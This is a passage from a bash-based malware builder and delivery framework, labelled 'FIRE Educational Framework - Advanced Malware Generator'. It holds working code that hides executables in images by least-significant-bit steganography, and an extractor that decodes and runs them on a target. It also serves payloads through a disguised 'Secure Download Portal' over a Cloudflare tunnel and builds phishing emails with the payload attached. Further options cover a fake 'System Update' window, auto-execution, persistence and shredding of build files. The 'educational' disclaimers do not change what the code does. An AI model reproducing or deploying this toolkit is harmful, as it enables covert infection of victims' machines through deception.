                r = (r & 0xFE) | int(payload_binary[payload_index])
                payload_index += 1
            
            if payload_index < len(payload_binary):
                g = (g & 0xFE) | int(payload_binary[payload_index])
                payload_index += 1
            
            if payload_index < len(payload_binary):
                b = (b & 0xFE) | int(payload_binary[payload_index])
                payload_index += 1
            
            modified_pixels.append((r, g, b))
        
        # Create a new image with the modified pixels
        new_img = Image.new('RGB', (width, height))
        new_img.putdata(modified_pixels)
        
        # Save the new image
        new_img.save(output_path)
        
        print(f"Payload hidden in image: {output_path}")
        return True
        
    except Exception as e:
        print(f"Error hiding payload in image: {e}")
        return False

def extract_payload_from_image(image_path, output_path):
    try:
        # Open the image
        img = Image.open(image_path)
        
        # Convert image to RGB if it's not
        if img.mode != 'RGB':
            img = img.convert('RGB')
        
        # Get pixel data
        pixels = list(img.getdata())
        
        # Extract the least significant bits
        binary_data = ""
        
        for r, g, b in pixels:
            binary_data += str(r & 1)
            binary_data += str(g & 1)
            binary_data += str(b & 1)
        
        # Convert binary to string
        payload = ""
        for i in range(0, len(binary_data), 8):
            if i + 8 <= len(binary_data):
                byte = binary_data[i:i+8]
                payload += chr(int(byte, 2))
                
                # Check for the delimiter
                if payload.endswith("###END###"):
                    payload = payload[:-9]  # Remove the delimiter
                    break
        
        # Decode the base64 payload
        decoded_payload = base64.b64decode(payload)
        
        # Write the payload to the output file
        with open(output_path, 'wb') as f:
            f.write(decoded_payload)
        
        print(f"Payload extracted to: {output_path}")
        return True
        
    except Exception as e:
        print(f"Error extracting payload from image: {e}")
        return False

if __name__ == "__main__":
    if len(sys.argv) < 4:
        print("Usage: python3 steganography.py <mode> <input> <output> [payload]")
        print("Modes: hide, extract")
        sys.exit(1)
    
    mode = sys.argv[1]
    input_path = sys.argv[2]
    output_path = sys.argv[3]
    
    if mode == "hide":
        if len(sys.argv) < 5:
            print("Error: Payload path required for hide mode")
            sys.exit(1)
        
        payload_path = sys.argv[4]
        if hide_payload_in_image(input_path, payload_path, output_path):
            print("Payload successfully hidden in image")
            sys.exit(0)
        else:
            print("Failed to hide payload in image")
            sys.exit(1)
    
    elif mode == "extract":
        if extract_payload_from_image(input_path, output_path):
            print("Payload successfully extracted from image")
            sys.exit(0)
        else:
            print("Failed to extract payload from image")
            sys.exit(1)
    
    else:
        print("Error: Invalid mode. Use 'hide' or 'extract'")
        sys.exit(1)
EOF
    
    set_executable "$stego_script"
    
    # Hide the payload in the image
    echo -e "${Y}[*] Hiding payload in image...${NC}"
    if python3 "$stego_script" hide "$IMAGE_FILE" "$payload_path" "$output_image"; then
        log_message "SUCCESS" "Payload hidden in image: $output_image"
        
        # Create an extractor script for the target
        local extractor_script="$DELIVERY_DIR/extractor.py"
        cat > "$extractor_script" << EOF
#!/usr/bin/env python3
import os
import sys
import tempfile
import subprocess
from PIL import Image
import base64

def extract_and_execute(image_path):
    try:
        # Create a temporary file for the extracted payload
        with tempfile.NamedTemporaryFile(delete=False, suffix='.exe') as temp_file:
            temp_path = temp_file.name
        
        # Extract the payload from the image
        subprocess.run([sys.executable, "-c", '''
import sys
from PIL import Image
import base64

def extract_payload_from_image(image_path, output_path):
    try:
        # Open the image
        img = Image.open(image_path)
        
        # Convert image to RGB if it's not
        if img.mode != "RGB":
            img = img.convert("RGB")
        
        # Get pixel data
        pixels = list(img.getdata())
        
        # Extract the least significant bits
        binary_data = ""
        
        for r, g, b in pixels:
            binary_data += str(r & 1)
            binary_data += str(g & 1)
            binary_data += str(b & 1)
        
        # Convert binary to string
        payload = ""
        for i in range(0, len(binary_data), 8):
            if i + 8 <= len(binary_data):
                byte = binary_data[i:i+8]
                payload += chr(int(byte, 2))
                
                # Check for the delimiter
                if payload.endswith("###END###"):
                    payload = payload[:-9]  # Remove the delimiter
                    break
        
        # Decode the base64 payload
        decoded_payload = base64.b64decode(payload)
        
        # Write the payload to the output file
        with open(output_path, "wb") as f:
            f.write(decoded_payload)
        
        return True
        
    except Exception as e:
        return False

if extract_payload_from_image("''' + image_path + '''", "''' + temp_path + '''"):
    print("Payload extracted successfully")
else:
    print("Failed to extract payload")
    sys.exit(1)
'''])
        
        # Make the extracted payload executable
        os.chmod(temp_path, 0o755)
        
        # Execute the payload
        subprocess.Popen([temp_path], shell=True)
        
        return True
        
    except Exception as e:
        print(f"Error: {e}")
        return False

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: python3 extractor.py <image_path>")
        sys.exit(1)
    
    image_path = sys.argv[1]
    if extract_and_execute(image_path):
        print("Payload extracted and executed")
    else:
        print("Failed to extract and execute payload")
        sys.exit(1)
EOF
        
        set_executable "$extractor_script"
        
        # Create a simple HTML file to display the image
        local html_file="$DELIVERY_DIR/image_viewer.html"
        cat > "$html_file" << EOF
<!DOCTYPE html>
<html>
<head>
    <title>Image Viewer</title>
    <style>
        body { font-family: Arial, sans-serif; margin: 20px; background-color: #f5f5f5; }
        .container { max-width: 800px; margin: 0 auto; background-color: white; padding: 20px; border-radius: 10px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
        .image-container { text-align: center; margin: 20px 0; }
        .image-container img { max-width: 100%; border: 1px solid #ddd; border-radius: 5px; }
        .instructions { background-color: #e8f0fe; padding: 15px; border-radius: 5px; margin: 20px 0; }
        .download-btn { display: inline-block; background-color: #4285f4; color: white; padding: 10px 20px; text-decoration: none; border-radius: 5px; margin: 10px 0; }
        .download-btn:hover { background-color: #3367d6; }
        .footer { text-align: center; margin-top: 30px; color: #666; font-size: 12px; }
    </style>
</head>
<body>
    <div class="container">
        <h1>Image Viewer</h1>
        <div class="image-container">
            <img src="$(basename "$output_image")" alt="Image">
        </div>
        <div class="instructions">
            <h3>Instructions:</h3>
            <p>1. Download the image using the button below.</p>
            <p>2. Run the following command to extract and execute the hidden payload:</p>
            <pre>python3 extractor.py $(basename "$output_image")</pre>
        </div>
        <div style="text-align: center;">
            <a href="$(basename "$output_image")" class="download-btn" download>Download Image</a>
            <a href="extractor.py" class="download-btn" download>Download Extractor</a>
        </div>
        <div class="footer">
            <p>This image viewer is for educational purposes only.</p>
            <p>&copy; $(date +%Y) Educational Tools</p>
        </div>
    </div>
</body>
</html>
EOF
        
        # Copy the extractor script to the delivery directory
        cp "$extractor_script" "$DELIVERY_DIR/"
        
        # Copy the steganographic image to the delivery directory
        cp "$output_image" "$DELIVERY_DIR/"
        
        echo -e "${G}[+] Image steganography delivery prepared.${NC}"
        echo -e "${G}[+] Steganographic image: $output_image${NC}"
        echo -e "${G}[+] Extractor script: $extractor_script${NC}"
        echo -e "${G}[+] HTML viewer: $html_file${NC}"
        
        log_message "SUCCESS" "Image steganography delivery completed"
        return 0
    else
        log_message "ERROR" "Failed to hide payload in image"
        return 1
    fi
}

deliver_via_cloudflare_tunnel() {
    local payload_path=$1
    local local_port=$2
    
    echo -e "${Y}[*] Setting up Cloudflare tunnel delivery...${NC}"
    
    # Setup cloudflared
    if ! setup_cloudflared; then
        log_message "ERROR" "Failed to setup cloudflared"
        return 1
    fi
    
    # Create a simple HTTP server to serve the payload
    local server_script="$TEMP_DIR/server.py"
    cat > "$server_script" << EOF
#!/usr/bin/env python3
from flask import Flask, send_file, render_template_string, request, redirect
import os
import sys

app = Flask(__name__)

@app.route('/')
def index():
    # Check if the request is for the root domain or a specific path
    if request.path == '/':
        return render_template_string('''
<!DOCTYPE html>
<html>
<head>
    <title>Secure Download Portal</title>
    <style>
        body { font-family: Arial, sans-serif; margin: 40px; background-color: #f5f5f5; }
        .container { max-width: 800px; margin: 0 auto; background-color: white; padding: 30px; border-radius: 10px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
        .header { text-align: center; margin-bottom: 30px; }
        .download-btn { display: inline-block; background-color: #4285f4; color: white; padding: 15px 30px; text-decoration: none; border-radius: 5px; font-size: 18px; margin: 20px 0; }
        .download-btn:hover { background-color: #3367d6; }
        .info { background-color: #e8f0fe; padding: 15px; border-radius: 5px; margin: 20px 0; }
        .footer { text-align: center; margin-top: 30px; color: #666; }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>Secure Download Portal</h1>
            <p>Download your secure files</p>
        </div>
        <div class="info">
            <h3>File Information</h3>
            <p><strong>Filename:</strong> $(basename "$payload_path")</p>
            <p><strong>Size:</strong> $(get_file_size "$payload_path") bytes</p>
            <p><strong>Type:</strong> Secure Executable</p>
            <p><strong>Auto-Execution:</strong> $([ "$AUTO_EXECUTION" = true ] && echo "Enabled" || echo "Disabled")</p>
        </div>
        <div style="text-align: center;">
            <a href="/download" class="download-btn">Download File</a>
        </div>
        <div class="footer">
            <p>This is a secure download portal. All downloads are logged.</p>
            <p>&copy; $(date +%Y) Secure Downloads</p>
        </div>
    </div>
</body>
</html>
''')
    else:
        # For any other path, redirect to the download
        return redirect('/download')

@app.route('/download')
def download():
    payload_path = "$payload_path"
    if os.path.exists(payload_path):
        return send_file(payload_path, as_attachment=True, download_name="$(basename "$payload_path")")
    return "File not found", 404

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=$local_port, debug=False)
EOF
    
    set_executable "$server_script"
    
    # Start the HTTP server in background
    echo -e "${Y}[*] Starting HTTP server on port $local_port...${NC}"
    python3 "$server_script" &
    local server_pid=$!
    
    # Wait for server to start
    sleep 3
    
    # Start Cloudflare tunnel
    if start_cloudflare_tunnel "$local_port" "$TEMP_DIR"; then
        echo -e "${G}[+] Cloudflare tunnel established successfully!${NC}"
        echo -e "${G}[+] Secure download URL: $CLOUDFLARE_TUNNEL_URL${NC}"
        
        # Create a QR code for the URL if qrencode is available
        if command -v qrencode &> /dev/null; then
            echo -e "${Y}[*] Generating QR code for download URL...${NC}"
            qrencode -t ANSI "$CLOUDFLARE_TUNNEL_URL"
        fi
        
        # Save tunnel information
        local tunnel_info="$DELIVERY_DIR/cloudflare_tunnel_info.txt"
        cat > "$tunnel_info" << EOF
CLOUDFLARE TUNNEL INFORMATION
=============================
Tunnel URL: $CLOUDFLARE_TUNNEL_URL
Direct Download Link: $CLOUDFLARE_TUNNEL_URL/download
Local Port: $local_port
Server PID: $server_pid
Tunnel PID: $(cat "$TEMP_DIR/tunnel.pid" 2>/dev/null || echo "N/A")
Start Time: $(date)
Payload: $(basename "$payload_path")
Auto-Execution: $([ "$AUTO_EXECUTION" = true ] && echo "Enabled" || echo "Disabled")
Appearance: $([ "$FAKE_GUI_ENABLED" = true ] && echo "Fake GUI (System Update)" || echo "Silent")

Usage:
1. Share the tunnel URL with your target
2. Target can download the payload securely using: $CLOUDFLARE_TUNNEL_URL/download
3. All traffic is encrypted through Cloudflare

To stop the tunnel:
kill $server_pid
kill $(cat "$TEMP_DIR/tunnel.pid" 2>/dev/null || echo "N/A")
EOF
        
        echo -e "${G}[+] Tunnel information saved to: $tunnel_info${NC}"
        echo -e "${G}[+] Direct download link: $CLOUDFLARE_TUNNEL_URL/download${NC}"
        
        # Ask if user wants to keep the tunnel running
        echo -e "\n${Y}[*] Tunnel is now running. Press Ctrl+C to stop the tunnel.${NC}"
        echo -e "${Y}[*] Or run the following commands to stop it:${NC}"
        echo -e "${Y}    kill $server_pid${NC}"
        echo -e "${Y}    kill $(cat "$TEMP_DIR/tunnel.pid" 2>/dev/null || echo "N/A")${NC}"
        
        # Wait for user to stop the tunnel
        trap 'stop_cloudflare_tunnel; kill $server_pid 2>/dev/null; exit' INT
        while true; do
            sleep 1
        done
    else
        kill $server_pid 2>/dev/null
        log_message "ERROR" "Failed to establish Cloudflare tunnel"
        return 1
    fi
}

# Other delivery methods (abbreviated for space - keep all the existing ones)
deliver_via_email() {
    local payload_path=$1
    local recipients=$2
    
    echo -e "${Y}[*] Preparing email delivery...${NC}"
    
    # Create email template
    local email_template="$DELIVERY_DIR/email_template.html"
    local subject="Important Document - Please Review"
    
    # Generate a convincing email template
    cat > "$email_template" << EOF
<!DOCTYPE html>
<html>
<head>
    <title>Important Document</title>
    <style>
        body { font-family: Arial, sans-serif; margin: 20px; }
        .header { background-color: #f2f2f2; padding: 10px; text-align: center; }
        .content { margin-top: 20px; }
        .footer { margin-top: 30px; font-size: 12px; color: #777; }
    </style>
</head>
<body>
    <div class="header">
        <h2>Important Document</h2>
    </div>
    <div class="content">
        <p>Dear recipient,</p>
        <p>Please find attached an important document that requires your immediate attention.</p>
        <p>This document contains critical information that needs to be reviewed by the end of business day.</p>
        <p>Thank you for your cooperation.</p>
        <p>Best regards,<br>Administrative Department</p>
    </div>
    <div class="footer">
        <p>This email and any attachments are confidential and intended solely for the use of the individual or entity to whom they are addressed.</p>
    </div>
</body>
</html>
EOF
    
    # Create a Python script to send emails
    local email_script="$DELIVERY_DIR/send_email.py"
    cat > "$email_script" << EOF
#!/usr/bin/env python3
import smtplib
import ssl
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import sys

def send_email(recipient, payload_path, template_path):
    # Email configuration (educational template only)
    sender_email = "admin@example.com"
    password = "password"
    
    # Create message
    message = MIMEMultipart("alternative")
    message["Subject"] = "$subject"
    message["From"] = sender_email
    message["To"] = recipient
    
    # Read HTML template
    with open(template_path, "r") as f:
        html_content = f.read()
    
    # Attach HTML content
    html_part = MIMEText(html_content, "html")
    message.attach(html_part)
    
    # Attach payload
    with open(payload_path, "rb") as attachment:
        part = MIMEBase("application", "octet-stream")
        part.set_payload(attachment.read())
    
    encoders.encode_base64(part)
    
    filename = payload_path.split("/")[-1]
    part.add_header(
        "Content-Disposition",
        f"attachment; filename= {filename}",
    )
    
    message.attach(part)
    
    # This is an educational template - no actual emails are sent
    print(f"Email prepared for {recipient}")
    print(f"Subject: {message['Subject']}")
    print(f"Attachment: {filename}")
    print("This is an educational template - no actual emails are sent")
    
    # In a real scenario, you would connect to an SMTP server and send the email
    # context = ssl.create_default_context()
    # with smtplib.SMTP_SSL("smtp.example.com", 465, context=context) as server:
    #     server.login(sender_email, password)
    #     server.sendmail(sender_email, recipient, message.as_string())
    
    return True

if __name__ == "__main__":
    if len(sys.argv) < 3:
        print("Usage: python3 send_email.py <recipient> <payload_path>")
        sys.exit(1)
    
    recipient = sys.argv[1]
    payload_path = sys.argv[2]
    template_path = sys.argv[3] if len(sys.argv) > 3 else "$email_template"
    
    send_email(recipient, payload_path, template_path)
EOF
    
    set_executable "$email_script"
    
    # Send to all recipients
    IFS=',' read -ra RECIPIENTS <<< "$recipients"
    for recipient in "${RECIPIENTS[@]}"; do
        recipient=$(echo "$recipient" | xargs)  # Trim whitespace
        if [ -n "$recipient" ]; then
            echo -e "${Y}[*] Preparing email for $recipient...${NC}"
            python3 "$email_script" "$recipient" "$payload_path" "$email_template"
        fi
    done
    
    log_message "SUCCESS" "Email delivery preparation completed"
    return 0
}

# Cleanup
cleanup() {
    log_message "INFO" "Performing cleanup..."
    
    # Stop Cloudflare tunnel if running
    stop_cloudflare_tunnel
    
    cd ..
    
    if [ "$KEEP_BUILD_FILES" != "true" ]; then
        if [ -d "$WORK_DIR" ]; then
            if command -v shred &> /dev/null; then
                find "$WORK_DIR" -type f -exec shred -vfz -n 3 {} \;
            fi
            rm -rf "$WORK_DIR"
            log_message "INFO" "Removed temporary build files"
        fi
    else
        log_message "INFO" "Keeping temporary build files as requested"
    fi
    
    if [ -d "$TEMP_DIR" ]; then
        if command -v shred &> /dev/null; then
            find "$TEMP_DIR" -type f -exec shred -vfz -n 3 {} \;
        fi
        rm -rf "$TEMP_DIR"
    fi
    
    deactivate 2>/dev/null || true
    
    log_message "SUCCESS" "Cleanup complete"
}

# Update checking
check_for_updates() {
    echo -e "${Y}[*] Checking for updates...${NC}"
    
    # Record the current time as the last update check
    date > ".fire_last_update"
    
    # In a real implementation, this would check for updates from a remote repository
    # For educational purposes, we'll just simulate the check
    echo -e "${G}[+] FIRE Educational Framework is up to date.${NC}"
    echo -e "${G}[+] Current version: $SCRIPT_VERSION${NC}"
    
    log_message "INFO" "Update check completed"
}

# Help function
show_help() {
    cat << EOF
FIRE Educational Framework - Advanced Malware Generator (Educational Version Only)

Usage: $0 [OPTIONS]

OPTIONS:
    --help, -h              Show this help message
    --version, -v           Show version information
    --check-updates         Check for updates
    --config-file FILE      Use specified configuration file
    --no-progress           Disable progress bars
    --no-verification       Disable payload verification

EXAMPLES:
    $0                      Run the framework with interactive configuration
    $0 --config-file cfg    Use a specific configuration file
    $0 --check-updates      Check for updates

WARNING: This tool is for educational purposes only.
Unauthorized use is illegal and unethical.

EOF
}

# Command line argument processing
process_args() {
    while [[ $# -gt 0 ]]; do
        case $1 in
            --help|-h)
                show_help
                exit 0
                ;;
            --version|-v)
                echo "FIRE Educational Framework v$SCRIPT_VERSION"
                exit 0
                ;;
            --check-updates)
                check_for_updates
                exit 0
                ;;
            --config-file)
                CONFIG_FILE="$2"
                shift 2
                ;;
            --no-progress)
                PROGRESS_BAR_ENABLED=false
                shift
                ;;
            --no-verification)
                VERIFICATION_ENABLED=false
                shift
                ;;
            *)
                echo -e "${R}[!] Unknown option: $1${NC}"
                show_help
                exit 1
                ;;
        esac
    done
}

# Initialization
init() {
    trap cleanup EXIT
    
    init_logging
    display_banner
    check_dependencies
    
    # Load plugins
    load_plugins
    
    if ! load_config; then
        log_message "INFO" "No existing configuration found, using defaults"
    fi
}

# Main function
main() {
    # Process command line arguments
    process_args "$@"
    
    init
    
    get_configuration
    setup_environment
    
    if generate_payload "$PAYLOAD_TYPE" "$ATTACKER_IP" "$ATTACKER_PORT" "$TARGET_OS" "$FINAL_NAME"; then
        if [ "$TARGET_OS" == "Multi-OS" ]; then
            echo -e "${G}>> MULTI-OS PAYLOAD GENERATION COMPLETE. Check the 'multi_os_builds' directory.${NC}"
            echo -e "${G}>> This payload will auto-detect the target OS and execute the appropriate code.${NC}"
            if [ "$FAKE_GUI_ENABLED" = true ]; then
                echo -e "${G}>> Fake GUI is ENABLED - Payload will show 'System Update' window.${NC}"
            else
                echo -e "${Y}>> Fake GUI is DISABLED - Payload will run silently.${NC}"
            fi
            if [ "$AUTO_EXECUTION" = true ]; then
                echo -e "${G}>> Auto-execution is ENABLED - Payload will run automatically on installation.${NC}"
                echo -e "${G}>> Persistence method: $PERSISTENCE_METHOD${NC}"
            else
                echo -e "${Y}>> Auto-execution is DISABLED - Payload requires manual execution.${NC}"
            fi
            log_message "SUCCESS" "Multi-OS payload generation completed successfully"
        else
            echo -e "${G}>> PAYLOAD GENERATION COMPLETE. Check the parent directory for '$FINAL_NAME'.${NC}"
            echo -e "${G}>> Metadata saved as '${FINAL_NAME}.meta'${NC}"
            if [ "$FAKE_GUI_ENABLED" = true ]; then
                echo -e "${G}>> Fake GUI is ENABLED - Payload will show 'System Update' window.${NC}"
            else
                echo -e "${Y}>> Fake GUI is DISABLED - Payload will run silently.${NC}"
            fi
            if [ "$AUTO_EXECUTION" = true ]; then
                echo -e "${G}>> Auto-execution is ENABLED - Payload will run automatically on installation.${NC}"
                echo -e "${G}>> Persistence method: $PERSISTENCE_METHOD${NC}"
            else
                echo -e "${Y}>> Auto-execution is DISABLED - Payload requires manual execution.${NC}"
            fi
            log_message "SUCCESS" "Payload generation completed successfully"
        fi
        
        # If delivery method is specified, deliver the payload
        if [ -n "$DELIVERY_METHOD" ]; then
            # Get the full path to the payload
            local payload_full_path
            if [ "$TARGET_OS" == "Multi-OS" ]; then
                payload_full_path="$(pwd)/../multi_os_builds/$FINAL_NAME"
            else
                payload_full_path="$(pwd)/../$FINAL_NAME"
            fi
            
            if deliver_payload "$payload_full_path" "$DELIVERY_METHOD" "$DELIVERY_TARGETS"; then
                echo -e "${G}>> DELIVERY COMPLETE.${NC}"
                log_message "SUCCESS" "Payload delivery completed successfully"
            else
                echo -e "${R}>> DELIVERY FAILED.${NC}"
                log_message "ERROR" "Payload delivery failed"
            fi
        fi
    else
        echo -e "${R}>> PAYLOAD GENERATION FAILED.${NC}"
        log_message "ERROR" "Payload generation failed"
    fi
}

# Execute main function with all arguments
main "$@"
